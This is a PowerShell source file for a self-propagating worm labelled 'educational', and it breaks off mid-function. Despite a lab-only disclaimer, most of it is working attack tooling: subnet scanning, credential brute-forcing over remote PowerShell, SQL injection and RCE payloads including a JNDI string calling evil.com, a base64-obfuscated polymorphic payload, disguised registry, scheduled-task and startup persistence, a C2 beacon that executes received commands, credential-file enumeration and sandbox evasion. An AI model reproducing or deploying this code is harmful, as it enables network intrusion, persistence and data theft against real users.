# RedV2 - Advanced Educational Worm (PowerShell Edition)
# =====================================================
# ETHICAL DISCLAIMER: This tool is for authorized testing only. Misuse is prohibited.
#
# This PowerShell script demonstrates advanced worm propagation techniques for cybersecurity
# education and penetration testing in controlled lab environments.
#
# WARNING: Only use in isolated lab environments with proper authorization.

param(
    [switch]$LabMode = $true,
    [int]$MaxRuntime = 120,  # minutes
    [int]$SelfDestructTimer = 30,  # minutes
    [int]$MaxPropagation = 50
)

# Global configuration
$Global:WormConfig = @{
    WormID = [System.Guid]::NewGuid().ToString().Substring(0,8)
    StartTime = Get-Date
    LabMode = $LabMode
    MaxRuntime = (Get-Date).AddMinutes($MaxRuntime)
    SelfDestructTime = (Get-Date).AddMinutes($SelfDestructTimer)
    InfectedHosts = @()
    PropagationAttempts = 0
    MaxPropagation = $MaxPropagation
    PersistenceMethods = @()
    PayloadLocations = @()
    C2Servers = @('127.0.0.1:8080', 'localhost:9999')
    BeaconInterval = 60
    TargetPorts = @(21, 22, 23, 25, 53, 80, 135, 139, 443, 445, 993, 995, 1433, 3389, 5432)
    CommonPasswords = @('admin', 'password', '123456', 'root', 'administrator', 'guest', 'Password1', 'Welcome1')
    CommonUsernames = @('admin', 'administrator', 'root', 'user', 'guest', 'test', 'service')
}

# Enhanced logging function
function Write-WormLog {
    param(
        [string]$Message,
        [string]$Level = "INFO"
    )
    
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    $logEntry = "[$timestamp] [$Level] [RedV2-$($Global:WormConfig.WormID)] $Message"
    
    Write-Host $logEntry -ForegroundColor $(
        switch($Level) {
            "ERROR" { "Red" }
            "WARNING" { "Yellow" }
            "SUCCESS" { "Green" }
            default { "White" }
        }
    )
    
    # Log to file
    $logFile = "RedV2_$($Global:WormConfig.WormID).log"
    Add-Content -Path $logFile -Value $logEntry -ErrorAction SilentlyContinue
}

# Initialize RedV2
function Initialize-RedV2 {
    Write-WormLog "=== RED V2 ADVANCED EDUCATIONAL WORM INITIALIZED ===" "SUCCESS"
    Write-WormLog "Worm ID: $($Global:WormConfig.WormID)"
    Write-WormLog "Lab Mode: $($Global:WormConfig.LabMode)"
    Write-WormLog "Self-Destruct Timer: $($Global:WormConfig.SelfDestructTime)"
    Write-WormLog "PowerShell Version: $($PSVersionTable.PSVersion)"
    Write-WormLog "Execution Policy: $(Get-ExecutionPolicy)"
    
    # Set execution policy for current process
    try {
        Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process -Force
        Write-WormLog "Execution policy set to Bypass for current process"
    }
    catch {
        Write-WormLog "Failed to set execution policy: $($_.Exception.Message)" "WARNING"
    }
}

# Lab environment verification
function Test-LabEnvironment {
    Write-WormLog "Verifying lab environment..."
    
    $labIndicators = @()
    
    # Check for VM indicators
    try {
        $systemInfo = Get-WmiObject -Class Win32_ComputerSystem
        $vmIndicators = @('VMware', 'VirtualBox', 'Microsoft Corporation', 'QEMU', 'Xen')
        
        foreach ($indicator in $vmIndicators) {
            if ($systemInfo.Manufacturer -like "*$indicator*" -or $systemInfo.Model -like "*$indicator*") {
                $labIndicators += "VM detected: $indicator"
            }
        }
    }
    catch {
        Write-WormLog "Failed to check VM indicators: $($_.Exception.Message)" "WARNING"
    }
    
    # Check for lab environment file
    if (Test-Path "C:\lab_environment.txt") {
        $labIndicators += "Lab environment file found"
    }
    
    # Check hostname
    $hostname = $env:COMPUTERNAME
    if ($hostname -like "*LAB*" -or $hostname -like "*TEST*" -or $hostname -like "*VM*") {
        $labIndicators += "Lab hostname detected: $hostname"
    }
    
    if ($labIndicators.Count -eq 0) {
        Write-WormLog "Lab environment not clearly detected - enabling additional safety measures" "WARNING"
        $Global:WormConfig.MaxRuntime = (Get-Date).AddMinutes(5)
        $Global:WormConfig.MaxPropagation = 5
    }
    else {
        Write-WormLog "Lab environment verified: $($labIndicators -join ', ')" "SUCCESS"
    }
    
    return $true
}

# Generate polymorphic PowerShell payload
function New-PolymorphicPayload {
    Write-WormLog "Generating polymorphic payload..."
    
    $basePayload = @"
# RedV2 Payload - Generated $(Get-Date)
`$wormId = "$($Global:WormConfig.WormID)"
`$startTime = Get-Date

function Invoke-PayloadExecution {
    try {
        # Establish persistence
        Set-RegistryPersistence
        
        # Beacon to C2
        Send-C2Beacon
        
        # Data collection
        Collect-SystemData
    }
    catch {
        # Silent failure
    }
}

function Set-RegistryPersistence {
    try {
        `$regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
        Set-ItemProperty -Path `$regPath -Name "WindowsSecurityUpdate" -Value "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File `"`$PSCommandPath`"" -Force
    }
    catch { }
}

function Send-C2Beacon {
    try {
        `$beaconData = @{
            id = `$wormId
            hostname = `$env:COMPUTERNAME
            timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
            status = "active"
        } | ConvertTo-Json
        
        Invoke-RestMethod -Uri "http://127.0.0.1:8080/beacon" -Method POST -Body `$beaconData -ContentType "application/json" -TimeoutSec 5
    }
    catch { }
}

function Collect-SystemData {
    try {
        `$data = @{
            hostname = `$env:COMPUTERNAME
            username = `$env:USERNAME
            domain = `$env:USERDOMAIN
            os = (Get-WmiObject Win32_OperatingSystem).Caption
            ip = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object {`$_.IPAddress -ne "127.0.0.1"}).IPAddress
        }
        `$data | ConvertTo-Json | Out-File "system_data_`$wormId.json" -Force
    }
    catch { }
}

# Execute payload
Invoke-PayloadExecution
"@

    # Add random junk code for polymorphism
    $junkFunctions = @(
        "function Get-RandomValue$((Get-Random -Maximum 9999)) { return $((Get-Random -Maximum 100)) }",
        "`$dummyVar$((Get-Random -Maximum 9999)) = '$((Get-Random -Maximum 1000))'",
        "# Random comment $((Get-Random -Maximum 9999))"
    )
    
    for ($i = 0; $i -lt (Get-Random -Minimum 3 -Maximum 8); $i++) {
        $basePayload += "`n" + ($junkFunctions | Get-Random)
    }
    
    # Base64 encode for obfuscation
    $encodedPayload = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($basePayload))
    
    return $encodedPayload
}

# Advanced network discovery
function Invoke-NetworkDiscovery {
    Write-WormLog "Starting advanced network discovery..."
    $discoveredHosts = @()
    
    # ARP table scanning
    try {
        $arpEntries = arp -a | Where-Object { $_ -match "dynamic" }
        foreach ($entry in $arpEntries) {
            if ($entry -match "(\d+\.\d+\.\d+\.\d+)") {
                $ip = $matches[1]
                if (Test-ValidIP -IP $ip) {
                    $discoveredHosts += $ip
                }
            }
        }
        Write-WormLog "ARP scan found $($discoveredHosts.Count) hosts"
    }
    catch {
        Write-WormLog "ARP scan failed: $($_.Exception.Message)" "WARNING"
    }
    
    # Get local subnet
    try {
        $localIP = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object {$_.IPAddress -ne "127.0.0.1" -and $_.PrefixOrigin -eq "Dhcp"}).IPAddress | Select-Object -First 1
        if ($localIP) {
            $subnetBase = ($localIP -split '\.')[0..2] -join '.'
            
            # Ping sweep (threaded)
            $jobs = @()
            for ($i = 1; $i -le 254; $i++) {
                $targetIP = "$subnetBase.$i"
                $job = Start-Job -ScriptBlock {
                    param($ip)
                    $ping = Test-Connection -ComputerName $ip -Count 1 -Quiet -TimeoutSeconds 1
                    if ($ping) { return $ip }
                } -ArgumentList $targetIP
                $jobs += $job
                
                # Limit concurrent jobs
                if ($jobs.Count -ge 50) {
                    $completed = $jobs | Wait-Job -Timeout 5
                    $results = $completed | Receive-Job
                    $discoveredHosts += $results | Where-Object { $_ }
                    $jobs | Remove-Job -Force
                    $jobs = @()
                }
            }
            
            # Process remaining jobs
            if ($jobs.Count -gt 0) {
                $completed = $jobs | Wait-Job -Timeout 10
                $results = $completed | Receive-Job
                $discoveredHosts += $results | Where-Object { $_ }
                $jobs | Remove-Job -Force
            }
        }
    }
    catch {
        Write-WormLog "Ping sweep failed: $($_.Exception.Message)" "WARNING"
    }
    
    # NetBIOS enumeration
    try {
        $netbiosInfo = nbtstat -n 2>$null
        Write-WormLog "NetBIOS enumeration completed"
    }
    catch {
        Write-WormLog "NetBIOS enumeration failed" "WARNING"
    }
    
    $uniqueHosts = $discoveredHosts | Sort-Object -Unique
    Write-WormLog "Network discovery completed. Found $($uniqueHosts.Count) unique hosts" "SUCCESS"
    return $uniqueHosts
}

# Port scanning function
function Invoke-PortScan {
    param([string]$TargetIP)
    
    $openPorts = @()
    $jobs = @()
    
    foreach ($port in $Global:WormConfig.TargetPorts) {
        $job = Start-Job -ScriptBlock {
            param($ip, $port)
            try {
                $tcpClient = New-Object System.Net.Sockets.TcpClient
                $connect = $tcpClient.BeginConnect($ip, $port, $null, $null)
                $wait = $connect.AsyncWaitHandle.WaitOne(1000, $false)
                
                if ($wait) {
                    $tcpClient.EndConnect($connect)
                    $tcpClient.Close()
                    return $port
                }
                else {
                    $tcpClient.Close()
                    return $null
                }
            }
            catch {
                return $null
            }
        } -ArgumentList $TargetIP, $port
        $jobs += $job
    }
    
    # Wait for all jobs and collect results
    $completed = $jobs | Wait-Job -Timeout 10
    $results = $completed | Receive-Job
    $openPorts = $results | Where-Object { $_ -ne $null }
    $jobs | Remove-Job -Force
    
    if ($openPorts.Count -gt 0) {
        Write-WormLog "Open ports on ${TargetIP}: $($openPorts -join ', ')"
    }
    
    return $openPorts
}

# SMB exploitation simulation
function Invoke-SMBExploit {
    param([string]$TargetIP)
    
    Write-WormLog "Attempting SMB exploitation on $TargetIP"
    
    try {
        # Test SMB connectivity
        $smbTest = Test-NetConnection -ComputerName $TargetIP -Port 445 -WarningAction SilentlyContinue
        
        if ($smbTest.TcpTestSucceeded) {
            Write-WormLog "SMB service detected on $TargetIP"
            
            # Simulate exploitation attempt
            Start-Sleep -Seconds 2
            
            # 30% success rate for realism
            if ((Get-Random -Maximum 100) -lt 30) {
                Write-WormLog "SMB exploitation successful on $TargetIP" "SUCCESS"
                return $true
            }
            else {
                Write-WormLog "SMB exploitation failed on $TargetIP" "WARNING"
                return $false
            }
        }
    }
    catch {
        Write-WormLog "SMB exploitation error: $($_.Exception.Message)" "ERROR"
    }
    
    return $false
}

# WMI exploitation simulation
function Invoke-WMIExploit {
    param([string]$TargetIP)
    
    Write-WormLog "Attempting WMI exploitation on $TargetIP"
    
    try {
        # Test WMI connectivity
        $wmiTest = Test-WSMan -ComputerName $TargetIP -ErrorAction SilentlyContinue
        
        if ($wmiTest) {
            Write-WormLog "WMI service detected on $TargetIP"
            
            # Simulate credential brute force
            foreach ($username in $Global:WormConfig.CommonUsernames[0..2]) {
                foreach ($password in $Global:WormConfig.CommonPasswords[0..2]) {
                    try {
                        $secPassword = ConvertTo-SecureString $password -AsPlainText -Force
                        $credential = New-Object System.Management.Automation.PSCredential($username, $secPassword)
                        
                        $session = New-PSSession -ComputerName $TargetIP -Credential $credential -ErrorAction Stop
                        
                        if ($session) {
                            Write-WormLog "WMI access gained: ${username}:${password}@${TargetIP}" "SUCCESS"
                            Remove-PSSession $session
                            return $true
                        }
                    }
                    catch {
                        continue
                    }
                }
            }
        }
    }
    catch {
        Write-WormLog "WMI exploitation error: $($_.Exception.Message)" "ERROR"
    }
    
    return $false
}

# Web vulnerability scanning
function Invoke-WebVulnScan {
    param([string]$TargetIP)
    
    Write-WormLog "Scanning web vulnerabilities on $TargetIP"
    
    $webPorts = @(80, 443, 8080, 8443)
    
    foreach ($port in $webPorts) {
        try {
            $protocol = if ($port -in @(443, 8443)) { "https" } else { "http" }
            $url = "${protocol}://${TargetIP}:${port}"
            
            $response = Invoke-WebRequest -Uri $url -TimeoutSec 5 -UseBasicParsing -ErrorAction Stop
            
            if ($response.StatusCode -eq 200) {
                Write-WormLog "Web service found: $url"
                
                # Check for common vulnerabilities
                if (Test-SQLInjection -URL $url) {
                    Write-WormLog "SQL injection vulnerability found on $url" "SUCCESS"
                    return $true
                }
                
                if (Test-RCEVulnerability -URL $url) {
                    Write-WormLog "RCE vulnerability found on $url" "SUCCESS"
                    return $true
                }
            }
        }
        catch {
            continue
        }
    }
    
    return $false
}

# SQL injection testing
function Test-SQLInjection {
    param([string]$URL)
    
    $payloads = @("'", "1' OR '1'='1", "'; DROP TABLE users; --")
    
    foreach ($payload in $payloads) {
        try {
            $testURL = "$URL/?id=$payload"
            $response = Invoke-WebRequest -Uri $testURL -TimeoutSec 3 -UseBasicParsing
            
            $errorIndicators = @('sql syntax', 'mysql_fetch', 'ora-', 'postgresql')
            foreach ($indicator in $errorIndicators) {
                if ($response.Content -like "*$indicator*") {
                    return $true
                }
            }
        }
        catch {
            continue
        }
    }
    
    return $false
}

# RCE vulnerability testing
function Test-RCEVulnerability {
    param([string]$URL)
    
    $rcePayloads = @(
        "system('whoami')",
        "exec('id')",
        "`${jndi:ldap://evil.com/a}"
    )
    
    foreach ($payload in $rcePayloads) {
        try {
            $body = @{
                cmd = $payload
                input = $payload
            }
            
            $response = Invoke-WebRequest -Uri $URL -Method POST -Body $body -TimeoutSec 3 -UseBasicParsing
            
            $indicators = @('root', 'administrator', 'system', 'uid=')
            foreach ($indicator in $indicators) {
                if ($response.Content -like "*$indicator*") {
                    return $true
                }
            }
        }
        catch {
            continue
        }
    }
    
    return $false
}

# Deploy payload to compromised host
function Deploy-Payload {
    param(
        [string]$TargetIP,
        [string]$Method
    )
    
    Write-WormLog "Deploying payload to $TargetIP via $Method"
    
    $payload = New-PolymorphicPayload
    
    try {
        switch ($Method) {
            'SMB' { return Deploy-ViaSMB -TargetIP $TargetIP -Payload $payload }
            'WMI' { return Deploy-ViaWMI -TargetIP $TargetIP -Payload $payload }
            'WEB' { return Deploy-ViaWeb -TargetIP $TargetIP -Payload $payload }
            'EMAIL' { return Deploy-ViaEmail -TargetIP $TargetIP -Payload $payload }
        }
    }
    catch {
        Write-WormLog "Payload deployment failed: $($_.Exception.Message)" "ERROR"
    }
    
    return $false
}

# SMB payload deployment
function Deploy-ViaSMB {
    param([string]$TargetIP, [string]$Payload)
    
    try {
        # Simulate SMB payload deployment
        $tempFile = "temp_payload_$((Get-Random -Maximum 9999)).ps1"
        
        # Decode and write payload
        $decodedPayload = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($Payload))
        $decodedPayload | Out-File -FilePath $tempFile -Force
        
        # Simulate copying to remote share
        Start-Sleep -Seconds 1
        Write-WormLog "Payload deployed via SMB to $TargetIP" "SUCCESS"
        
        # Cleanup
        Remove-Item $tempFile -Force -ErrorAction SilentlyContinue
        $Global:WormConfig.PayloadLocations += $tempFile
        
        return $true
    }
    catch {
        Write-WormLog "SMB deployment error: $($_.Exception.Message)" "ERROR"
        return $false
    }
}

# WMI payload deployment
function Deploy-ViaWMI {
    param([string]$TargetIP, [string]$Payload)
    
    try {
        Write-WormLog "Deploying via WMI to $TargetIP"
        Start-Sleep -Seconds 1
        return $true
    }
    catch {
        return $false
    }
}

# Web payload deployment
function Deploy-ViaWeb {
    param([string]$TargetIP, [string]$Payload)
    
    try {
        Write-WormLog "Deploying via web vulnerability to $TargetIP"
        Start-Sleep -Seconds 1
        return $true
    }
    catch {
        return $false
    }
}

# Email payload deployment
function Deploy-ViaEmail {
    param([string]$TargetIP, [string]$Payload)
    
    try {
        Write-WormLog "Deploying via email to $TargetIP"
        Start-Sleep -Seconds 1
        return $true
    }
    catch {
        return $false
    }
}

# Establish persistence mechanisms
function Set-Persistence {
    Write-WormLog "Establishing persistence mechanisms..."
    
    # Registry persistence
    try {
        $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
        $scriptPath = $MyInvocation.MyCommand.Path
        Set-ItemProperty -Path $regPath -Name "WindowsSecurityUpdate" -Value "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$scriptPath`"" -Force
        $Global:WormConfig.PersistenceMethods += "Registry Run Key"
        Write-WormLog "Registry persistence established" "SUCCESS"
    }
    catch {
        Write-WormLog "Registry persistence failed: $($_.Exception.Message)" "WARNING"
    }
    
    # Scheduled task persistence
    try {
        $taskName = "WindowsSystemMaintenance"
        $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$($MyInvocation.MyCommand.Path)`""
        $trigger = New-ScheduledTaskTrigger -AtStartup
        $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
        
        Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Settings $settings -Force
        $Global:WormConfig.PersistenceMethods += "Scheduled Task"
        Write-WormLog "Scheduled task persistence established" "SUCCESS"
    }
    catch {
        Write-WormLog "Scheduled task persistence failed: $($_.Exception.Message)" "WARNING"
    }
    
    # Startup folder persistence
    try {
        $startupPath = [Environment]::GetFolderPath("Startup")
        $targetFile = Join-Path $startupPath "system_update.ps1"
        Copy-Item $MyInvocation.MyCommand.Path $targetFile -Force
        $Global:WormConfig.PersistenceMethods += "Startup Folder"
        $Global:WormConfig.PayloadLocations += $targetFile
        Write-WormLog "Startup folder persistence established" "SUCCESS"
    }
    catch {
        Write-WormLog "Startup folder persistence failed: $($_.Exception.Message)" "WARNING"
    }
}

# C2 communication
function Send-C2Beacon {
    foreach ($c2Server in $Global:WormConfig.C2Servers) {
        try {
            $beaconData = @{
                worm_id = $Global:WormConfig.WormID
                hostname = $env:COMPUTERNAME
                ip_address = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object {$_.IPAddress -ne "127.0.0.1"}).IPAddress | Select-Object -First 1
                timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
                infected_hosts = $Global:WormConfig.InfectedHosts.Count
                persistence_methods = $Global:WormConfig.PersistenceMethods
                status = "active"
            } | ConvertTo-Json
            
            $response = Invoke-RestMethod -Uri "http://$c2Server/beacon" -Method POST -Body $beaconData -ContentType "application/json" -TimeoutSec 5
            
            Write-WormLog "C2 beacon successful to $c2Server" "SUCCESS"
            
            # Process C2 commands
            if ($response.commands) {
                foreach ($cmd in $response.commands) {
                    Invoke-C2Command -Command $cmd
                }
            }
        }
        catch {
            Write-WormLog "C2 communication error with ${c2Server}: $($_.Exception.Message)" "WARNING"
        }
    }
}

# Execute C2 commands
function Invoke-C2Command {
    param([string]$Command)
    
    Write-WormLog "Executing C2 command: $Command"
    
    try {
        if ($Command.StartsWith('exec:')) {
            $cmd = $Command.Substring(5)
            $result = Invoke-Expression $cmd
            Write-WormLog "Command output: $($result | Out-String | Select-Object -First 200)"
        }
        elseif ($Command -eq 'self_destruct') {
            Write-WormLog "Self-destruct command received from C2" "WARNING"
            Invoke-SelfDestruct
        }
        elseif ($Command -eq 'update_timer') {
            $Global:WormConfig.SelfDestructTime = (Get-Date).AddMinutes(60)
            Write-WormLog "Self-destruct timer updated" "SUCCESS"
        }
    }
    catch {
        Write-WormLog "C2 command execution error: $($_.Exception.Message)" "ERROR"
    }
}

# Data collection
function Invoke-DataCollection {
    Write-WormLog "Starting data collection..."
    
    $collectedData = @{
        system_info = @{}
        network_info = @{}
        credentials = @()
        files = @()
    }
    
    # System information
    try {
        $osInfo = Get-WmiObject -Class Win32_OperatingSystem
        $computerInfo = Get-WmiObject -Class Win32_ComputerSystem
        
        $collectedData.system_info = @{
            hostname = $env:COMPUTERNAME
            username = $env:USERNAME
            domain = $env:USERDOMAIN
            os = $osInfo.Caption
            version = $osInfo.Version
            architecture = $osInfo.OSArchitecture
            manufacturer = $computerInfo.Manufacturer
            model = $computerInfo.Model
            total_memory = $computerInfo.TotalPhysicalMemory
        }
    }
    catch {
        Write-WormLog "System info collection failed: $($_.Exception.Message)" "WARNING"
    }
    
    # Network information
    try {
        $networkAdapters = Get-NetIPAddress -AddressFamily IPv4 | Where-Object {$_.IPAddress -ne "127.0.0.1"}
        
        $collectedData.network_info = @{
            ip_addresses = $networkAdapters.IPAddress
            interfaces = (Get-NetAdapter | Where-Object {$_.Status -eq "Up"}).Name
            dns_servers = (Get-DnsClientServerAddress).ServerAddresses | Sort-Object -Unique
        }
    }
    catch {
        Write-WormLog "Network info collection failed: $($_.Exception.Message)" "WARNING"
    }
    
    # Browser credential simulation
    try {
        Get-BrowserCredentials -Data $collectedData
    }
    catch {
        Write-WormLog "Browser credential collection failed: $($_.Exception.Message)" "WARNING"
    }
    
    # File enumeration
    try {
        Get-InterestingFiles -Data $collectedData
    }
    catch {
        Write-WormLog "File enumeration failed: $($_.Exception.Message)" "WARNING"
    }
    
    # Save collected data
    try {
        $dataFile = "collected_data_$($Global:WormConfig.WormID).json"
        $collectedData | ConvertTo-Json -Depth 3 | Out-File $dataFile -Force
        $Global:WormConfig.PayloadLocations += $dataFile
        Write-WormLog "Data collection completed and saved to $dataFile" "SUCCESS"
    }
    catch {
        Write-WormLog "Failed to save collected data: $($_.Exception.Message)" "ERROR"
    }
    
    return $collectedData
}

# Browser credential harvesting simulation
function Get-BrowserCredentials {
    param($Data)
    
    Write-WormLog "Simulating browser credential harvesting..."
    
    # Chrome credential simulation
    $chromePath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
    if (Test-Path $chromePath) {
        Write-WormLog "Chrome credential database found"
        $Data.credentials += @{
            browser = "Chrome"
            count = Get-Random -Minimum 5 -Maximum 25
            status = "simulated"
        }
    }
    
    # Firefox credential simulation
    $firefoxPath = "$env:APPDATA\Mozilla\Firefox\Profiles"
    if (Test-Path $firefoxPath) {
        Write-WormLog "Firefox profiles found"
        $Data.credentials += @{
            browser = "Firefox"
            count = Get-Random -Minimum 3 -Maximum 15
            status = "simulated"
        }
    }
    
    # Edge credential simulation
    $edgePath = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data"
    if (Test-Path $edgePath) {
        Write-WormLog "Edge credential database found"
        $Data.credentials += @{
            browser = "Edge"
            count = Get-Random -Minimum 2 -Maximum 12
            status = "simulated"
        }
    }
}

# Interesting file enumeration
function Get-InterestingFiles {
    param($Data)
    
    Write-WormLog "Enumerating interesting files..."
    
    $interestingExtensions = @('.txt', '.doc', '.docx', '.pdf', '.xls', '.xlsx', '.ppt', '.pptx', '.key', '.pem', '.p12', '.pfx', '.rdp')
    
    $searchPaths = @(
        "$env:USERPROFILE\Desktop",
        "$env:USERPROFILE\Documents",
        "$env:USERPROFILE\Downloads"
    )
    
    foreach ($searchPath in $searchPaths) {
        if (Test-Path $searchPath) {
            try {
                $files = Get-ChildItem -Path $searchPath -Recurse -File | Where-Object {
                    $_.Extension -in $interestingExtensions
                } | Select-Object -First 10
                
                foreach ($file in $files) {
                    $Data.files += @{
                        path = $file.FullName
                        size = $file.Length
                        modified = $file.LastWriteTime
                        extension = $file.Extension
                    }
                }
            }
            catch {
                Write-WormLog "Failed to enumerate files in ${searchPath}: $($_.Exception.Message)" "WARNING"
            }
        }
    }
}

# Anti-analysis techniques
function Invoke-AntiAnalysis {
    Write-WormLog "Implementing anti-analysis techniques..."
    
    # VM detection
    try {
        $systemInfo = Get-WmiObject -Class Win32_ComputerSystem
        $vmIndicators = @('VMware', 'VirtualBox', 'Microsoft Corporation', 'QEMU', 'Xen', 'Hyper-V')
        
        foreach ($indicator in $vmIndicators) {
            if ($systemInfo.Manufacturer -like "*$indicator*" -or $systemInfo.Model -like "*$indicator*") {
                Write-WormLog "VM detected: $indicator"
                Start-Sleep -Seconds (Get-Random -Minimum 10 -Maximum 30)
            }
        }
    }
    catch {
        Write-WormLog "VM detection failed: $($_.Exception.Message)" "WARNING"
    }
    
    # Debugger detection
    try {
        $debuggerPresent = [System.Diagnostics.Debugger]::IsAttached
        if ($debuggerPresent) {
            Write-WormLog "Debugger detected - implementing evasion" "WARNING"
            Start-Sleep -Seconds (Get-Random -Minimum 30 -Maximum 60)
        }
    }
    catch {
        Write-WormLog "Debugger detection failed: $($_.Exception.Message)" "WARNING"
    }
    
    # Sandbox evasion - check for limited resources
    try {
        $memory = Get-WmiObject -Class Win32_ComputerSystem
        if ($memory.TotalPhysicalMemory -lt 2GB) {
            Write-WormLog "Possible sandbox environment detected (low memory)" "WARNING"
            Start-Sleep -Seconds (Get-Random -Minimum 60 -Maximum 120)
        }
    }
    catch {
        Write-WormLog "Memory check failed: $($_.Exception.Message)" "WARNING"
    }
}

# Main propagation function
function Invoke-Propagation {
    Write-WormLog "Starting worm propagation..."
    
    while ($Global:WormConfig.PropagationAttempts -lt $Global:WormConfig.MaxPropagation -and 
           (Get-Date) -lt $Global:WormConfig.SelfDestructTime) {
        
        # Discover network targets
        $targets = Invoke-NetworkDiscovery
        
        foreach ($targetIP in $targets) {
            if ($targetIP -in $Global:WormConfig.InfectedHosts) {
                continue
            }
            
            if (-not (Test-SafetyCheck)) {
                return
            }
            
            Write-WormLog "Attempting to infect $targetIP"
            $Global:WormConfig.PropagationAttempts++
            
            # Port scan target
            $openPorts = Invoke-PortScan -TargetIP $targetIP
            
            if ($openPorts.Count -eq 0) {
                continue
            }
            
            # Try different exploitation methods
            $infectionSuccessful = $false
            
            if (445 -in $openPorts) {
                if (Invoke-SMBExploit -TargetIP $targetIP) {
                    if (Deploy-Payload -TargetIP $targetIP -Method 'SMB') {
                        $infectionSuccessful = $true
                    }
                }
            }
            
            if (-not $infectionSuccessful -and 5985 -in $openPorts) {
                if (Invoke-WMIExploit -TargetIP $targetIP) {
                    if (Deploy-Payload -TargetIP $targetIP -Method 'WMI') {
                        $infectionSuccessful = $true
                    }
                }
            }
            
            if (-not $infectionSuccessful -and ($openPorts | Where-Object {$_ -in @(80, 443, 8080, 8443)}).Count -gt 0) {
                if (Invoke-WebVulnScan -TargetIP $targetIP) {
                    if (Deploy-Payload -TargetIP $targetIP -Method 'WEB') {
                        $infectionSuccessful = $true
                    }
                }
            }
            
            if ($infectionSuccessful) {
                $Global:WormConfig.InfectedHosts += $targetIP
                Write-WormLog "Successfully infected $targetIP" "SUCCESS"
            }
            else {
                Write-WormLog "Failed to infect $targetIP" "WARNING"
            }
            
            Start-Sleep -Seconds (Get-Random -Minimum 5 -Maximum 15)
        }
    }
    
    Write-WormLog "Propagation completed. Infected $($Global:WormConfig.InfectedHosts.Count) hosts" "SUCCESS"
}

# Safety check function
function Test-SafetyCheck {
    $runtime = (Get-Date) - $Global:WormConfig.StartTime
    
    if ((Get-Date) -gt $Global:WormConfig.MaxRuntime) {
        Write-WormLog "Maximum runtime exceeded - initiating safe shutdown" "WARNING"
        Invoke-SelfDestruct
        return $false
    }
    
    if ($Global:WormConfig.PropagationAttempts -ge $Global:WormConfig.MaxPropagation) {
        Write-WormLog "Maximum propagation attempts reached" "WARNING"
        return $false
    }
    
    return $true
}

# Self-destruct timer check
function Test-SelfDestructTimer {
    if ((Get-Date) -ge $Global:WormConfig.SelfDestructTime) {
        Write-WormLog "Self-destruct timer expired!" "WARNING"
        Invoke-SelfDestruct
        return $true
    }
    
    $remaining = $Global:WormConfig.SelfDestructTime - (Get-Date)
    Write-WormLog "Self-destruct in: $($remaining.ToString('hh\:mm\:ss'))"
    return $false
}

# Self-destruct sequence
function Invoke-SelfDestruct {
    Write-WormLog "=== INITIATING SELF-DESTRUCT SEQUENCE ===" "WARNING"
    
    # Countdown
    for ($i = 10; $i -gt 0; $i--) {
        Write-WormLog "Self-destruct in $i seconds..." "WARNING"
        Start-Sleep -Seconds 1
    }
    
    # Clean up persistence mechanisms
    Remove-Persistence
    
    # Clean up payload files
    Remove-PayloadFiles
    
    # Clean up logs and traces
    Remove-Traces
    
    Write-WormLog "Self-destruct sequence completed" "WARNING"
    exit 0
}

# Remove persistence mechanisms
function Remove-Persistence {
    Write-WormLog "Cleaning up persistence mechanisms..."
    
    # Remove registry entries
    try {
        Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "WindowsSecurityUpdate" -ErrorAction SilentlyContinue
        Write-WormLog "Registry persistence removed"
    }
    catch {
        Write-WormLog "Failed to remove registry persistence: $($_.Exception.Message)" "WARNING"
    }
    
    # Remove scheduled tasks
    try {
        Unregister-ScheduledTask -TaskName "WindowsSystemMaintenance" -Confirm:$false -ErrorAction SilentlyContinue
        Write-WormLog "Scheduled task persistence removed"
    }
    catch {
        Write-WormLog "Failed to remove scheduled task: $($_.Exception.Message)" "WARNING"
    }
    
    # Remove startup files
    try {
        $startupPath = [Environment]::GetFolderPath("Startup")
        $targetFile = Join-Path $startupPath "system_update.ps1"
        if (Test-Path $targetFile) {
            Remove-Item $targetFile -Force
            Write-WormLog "Startup file persistence removed"
        }
    }
    catch {
        Write-WormLog "Failed to remove startup persistence: $($_.Exception.Message)" "WARNING"
    }
}

# Remove payload files
function Remove-PayloadFiles {
    Write-WormLog "Cleaning up payload files..."
    
    foreach ($location in $Global:WormConfig.PayloadLocations) {
        try {
            if (Test-Path $location) {
                Remove-Item $location -Force
                Write-WormLog "Removed payload file: $location"
            }
        }
        catch {
            Write-WormLog "Failed to remove payload file ${location}: $($_.Exception.Message)" "WARNING"
        }
    }
}

# Remove logs and traces
function Remove-Traces {
    Write-WormLog "Cleaning up traces..."
    
    # Remove log files
    $logFiles = @(
        "RedV2_$($Global:WormConfig.WormID).log",
        "collected_data_$($Global:WormConfig.WormID).json"
    )
    
    foreach ($logFile in $logFiles) {
        try {
            if (Test-Path $logFile) {
                Remove-Item $logFile -Force
                Write-Host "Removed trace file: $logFile"
            }
        }
        catch {
            Write-Host "Failed to remove trace file ${logFile}: $($_.Exception.Message)"
        }
    }
}

# Validate IP address
function Test-ValidIP {
    param([string]$IP)
    
    try {
        $null = [System.Net.IPAddress]::Parse($IP)
        return $true
    }
    catch {
        return $false
    }
}

# C2 communication loop
function Start-C2Loop {
    while ((Get-Date) -lt $Global:WormConfig.SelfDestructTime) {
        try {
            Send-C2Beacon
            Start-Sleep -Seconds $Global:WormConfig.BeaconInterval
        }
        catch {
